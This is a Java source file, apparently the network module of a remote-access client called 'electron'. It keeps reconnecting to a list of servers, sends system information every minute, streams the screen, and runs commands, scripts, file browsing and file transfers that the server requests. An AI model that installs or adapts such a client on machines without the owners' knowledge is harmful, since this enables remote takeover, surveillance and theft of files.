package electron.networking;

import java.awt.Robot;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.List;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import electron.console.logger;
import electron.networking.packets.ClientInfo;
import electron.networking.packets.ErrorPacket;
import electron.networking.packets.ExplorerPacketInput;
import electron.networking.packets.ExplorerPacketOutput;
import electron.networking.packets.InputPacket;
import electron.networking.packets.OutputMessagePacket;
import electron.networking.packets.ScriptFilePacket;
import electron.networking.packets.messageBoxPacketOut;

public class Connection extends Thread {
	private static boolean connected = false;
	private int port;
	private String ip;
	private List<String> servers;
	private static Socket server;
	private ClientInfoSender cldata = new ClientInfoSender();
	private ScreenSender screenSender = new ScreenSender();
	private ScreenV2Sender ssender = new ScreenV2Sender();
	public static Robot r;

	public Connection(List<String> servers) {
		this.servers = servers;
	}

	/**
	 * Is program connected to server
	 * 
	 * @return boolean
	 */
	public static boolean isConnected() {
		return connected;
	}

	public void run() {
		int serverID = 0;
		while (true) {
			// Timeout between connection attempts
			int timeout = 2000;
			try {
				// Selecting server to connect
				try {
					String address = servers.get(serverID);
					ip = address.split(":")[0];
					port = Integer.parseInt(address.split(":")[1]);
					if (serverID == servers.size() - 1)
						serverID = -1;
					if (serverID < servers.size())
						serverID++;
				} catch (Exception e) {
					logger.warn("[networking.Connect]: something went wrong with getting server's address. Message: "
							+ e.getMessage());
					serverID = 0;
					continue;
				}
				logger.log("[networking.Connect]: Trying to connect to " + ip + ":" + port + "...");
				try {
					server = new Socket(ip, port);
					logger.log("[networking.Connect]: connected to server.");
					connected = true;
					cldata = new ClientInfoSender();
					cldata.start();
					screenSender = new ScreenSender();
					screenSender.start();
					ssender = new ScreenV2Sender(r, ip + ":" + port);
					ssender.start();
					startReceiving();
				} catch (UnknownHostException e) {
					logger.log("[networking.Connect]: not connected: " + e.getMessage());
					connected = false;
					cldata.interrupt();
					screenSender.interrupt();
					ssender.interrupt();
					Thread.sleep(timeout);
				} catch (IOException e) {
					logger.log("[networking.Connect]: not connected: " + e.getMessage());
					connected = false;
					cldata.interrupt();
					screenSender.interrupt();
					ssender.interrupt();
					Thread.sleep(timeout);
				}
			} catch (InterruptedException e) {
				logger.error("[networking.Connect]: thread interrupted.");
				cldata.interrupt();
				ssender.interrupt();
				screenSender.interrupt();
				connected = false;
			}
		}
	}

	/**
	 * Send data to Server
	 * 
	 * @param data - String data to send
	 * @return boolean
	 */
	public static boolean send(String data) {
		if (!isConnected()) {
			return false;
		}
		OutputStream outToServer;
		try {
			outToServer = server.getOutputStream();
			DataOutputStream out = new DataOutputStream(outToServer);
			out.writeUTF(data);
			return true;
		} catch (IOException e) {
			logger.error("[networking.Connect.send]: error sending data: " + e.getMessage());
			ErrorPacket.sendError("[networking.Connect.send]: error sending data:" + e.getMessage());
			return false;
		}
	}

	/**
	 * Sends message to Server
	 * 
	 * @param msg - message to send
	 */
	public static void sendMessage(String msg) {
		OutputMessagePacket outpacket = new OutputMessagePacket(msg);
		Connection.send(outpacket.get().toJSONString());
	}

	public static void sendMessageBox(String title, String content) {
		messageBoxPacketOut outpacket = new messageBoxPacketOut(title, content);
		Connection.send(outpacket.get().toJSONString());
	}

	/**
	 * Receives data from server
	 * 
	 * @throws IOException
	 */
	private void startReceiving() throws IOException {
		while (true) {
			DataInputStream in = new DataInputStream(server.getInputStream());
			String data = in.readUTF();
			if (data.isEmpty()) {
				continue;
			}
			JSONObject input;
			try {
				input = (JSONObject) ParseJsThrought(data);
			} catch (ParseException e) {
				input = null;
			}
			if (input == null) {
				continue;
			}
			// Parsing packets
			if (isPacketType(0, input)) {
				// Command packet
				CommandExecutor.execute(InputPacket.parse(input.toJSONString()));
			} else if (isPacketType(1, input)) {
				// Explorer packet
				ExplorerPacketInput packet = new ExplorerPacketInput(input);
				CommandExecutor.executeExplorerCommand(packet);
				ExplorerPacketOutput outpacket = new ExplorerPacketOutput(packet.getPath(),
						ExplorerPacketOutput.getFilesDir(packet.getPath()));
				send(outpacket.get());
			} else if (isPacketType(2, input)) {
				// Upload packet
				if (Integer.parseInt(String.valueOf(input.get("type"))) == 1) {
					new FileReceiver(ip, port + 1, String.valueOf(input.get("path"))).start();
				} else {
					new FileSender(new File(String.valueOf(input.get("path"))), ip, port + 1).start();
				}
			} else if (isPacketType(3, input)) {
				// Script Packet
				CommandExecutor.executeScript(new ScriptFilePacket(input));
			} else if (isPacketType(4, input)) {
				CommandExecutor.executeEdit(input);
			} else {
				// It's unknown packet
				logger.warn("[electron.networking.Connection.startReceiving]: unknown packet type received.");
			}
		}
	}

	/**
	 * Parse String to JSON
	 * 
	 * @param d - String to parse
	 * @return Object
	 * @throws ParseException
	 */
	public static Object ParseJsThrought(String d) throws ParseException {
		Object obj = (new JSONParser()).parse(d);
		return obj;
	}

	private static boolean isPacketType(int type, JSONObject input) {
		if (input == null) {
			return false;
		}
		if (!input.containsKey("packettype")) {
			return false;
		}
		if (Integer.parseInt(String.valueOf(input.get("packettype"))) != type) {
			return false;
		}
		return true;
	}

}

/**
 * Sends data about PC to Server
 */
class ClientInfoSender extends Thread {
	public void run() {
		while (true) {
			try {
				if (!Connection.isConnected()) {
					return;
				}
				// Sending data
				Connection.send(ClientInfo.generatePacket().getJSON().toJSONString());
				Thread.sleep(60000);
			} catch (InterruptedException e) {
				logger.log("[electron.networking.ClientInfoSender]: interrupted thread.");
			}
		}
	}
}
